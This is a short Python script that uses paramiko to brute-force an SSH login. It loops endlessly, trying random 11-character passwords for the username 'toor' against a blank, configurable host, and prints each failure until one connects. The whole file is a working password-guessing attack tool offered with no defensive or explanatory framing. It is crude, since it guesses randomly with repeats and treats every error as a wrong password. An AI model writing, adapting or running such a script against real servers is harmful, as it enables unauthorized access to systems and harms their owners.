import paramiko
import sys
import random
import string
host = ""
port = 22
username = "toor"
passwords = "abcdggkcjgcjfcutfxrxsezwez51656894894653521321654" 

command = "ls"

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
while True:
    tryPassword = result_str = ''.join(random.choice(passwords) for i in range(11))
    try:
        ssh.connect(host, port, username, tryPassword)
        print("password found --------------> ",tryPassword)
        break
    except:
        print("password incorect !",tryPassword)
        

